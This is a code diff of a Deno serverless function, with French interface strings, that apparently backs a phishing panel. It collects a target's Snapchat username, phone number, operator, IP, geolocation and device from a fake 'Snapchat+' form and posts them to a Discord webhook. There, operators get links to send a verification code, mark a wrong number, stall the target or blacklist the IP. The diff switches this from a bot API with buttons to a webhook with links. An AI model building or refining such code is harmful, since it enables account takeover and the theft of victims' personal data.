@@ -1,7 +1,6 @@
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 
-const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
-const CHANNEL_ID = "1512395679958302843";
+const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
 
 Deno.serve(async (req) => {
   const authHeader = req.headers.get("authorization") || "";
@@ -13,15 +12,17 @@ Deno.serve(async (req) => {
 
   const base44 = createClientFromRequest(req);
   const body = await req.json();
-  const { snapchat, telephone, operateur, submissionId, ip, browser, device } = body;
+  const { snapchat, telephone, operateur, submissionId, ip, country, city, browser, device } = body;
 
   const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+  const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);
 
+  // Use all data from body parameters
   const finalIp = ip || "Inconnue";
   const finalBrowser = browser || "Inconnu";
   const finalDevice = device || "Inconnu";
 
-  // Geolocate IP
+  // Geolocate IP using dedicated function
   let finalCountry = "Inconnue";
   let finalCity = "Inconnue";
   try {
@@ -33,7 +34,7 @@ Deno.serve(async (req) => {
   } catch (e) {
     console.error("geolocateIP failed:", e.message);
   }
-
+  
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
 
   const now = new Date();
@@ -42,6 +43,12 @@ Deno.serve(async (req) => {
     hour: "2-digit", minute: "2-digit", second: "2-digit",
     timeZone: "Europe/Paris"
   });
+
+  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
+  const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
+  const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
+  const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
+  const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(finalIp)}`;
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
@@ -56,43 +63,22 @@ Deno.serve(async (req) => {
       { name: "💾 Appareil", value: finalDevice, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${finalIp}\``, inline: false },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
+      {
+        name: "⚡ Actions",
+        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})\n🚫 [**Blacklist instant**](${blacklistUrl})`,
+        inline: false
+      },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
-  // Buttons for admin actions
-  const components = [
-    {
-      type: 1,
-      components: [
-        { type: 2, style: 3, label: "✅ Envoyer le code", custom_id: `send_code:${submissionId}` },
-        { type: 2, style: 4, label: "❌ Mauvais numéro", custom_id: `wrong:${submissionId}` },
-        { type: 2, style: 1, label: "⏳ File d'attente", custom_id: `wait:${submissionId}` },
-        { type: 2, style: 4, label: "🚫 Blacklist", custom_id: `blacklist:${submissionId}:${encodeURIComponent(finalIp)}` },
-      ]
-    }
-  ];
-
-  // Post via Bot API
-  const msgRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
+  await fetch(DISCORD_WEBHOOK, {
     method: "POST",
-    headers: {
-      "Authorization": `Bot ${BOT_TOKEN}`,
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ content: "@everyone", embeds: [embed], components })
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
   });
 
-  const msgData = await msgRes.json();
-  const messageId = msgData.id;
-
-  // Store discord_message_id on submission
-  if (messageId) {
-    await base44.asServiceRole.entities.Submission.update(submissionId, { discord_message_id: messageId });
-  }
-
-  // Log action
   await base44.asServiceRole.entities.ActionLog.create({
     submission_id: submissionId,
     action: "submitted",
@@ -100,5 +86,5 @@ Deno.serve(async (req) => {
     timestamp: now.toISOString()
   });
 
-  return Response.json({ ok: true, message_id: messageId });
+  return Response.json({ ok: true });
 });
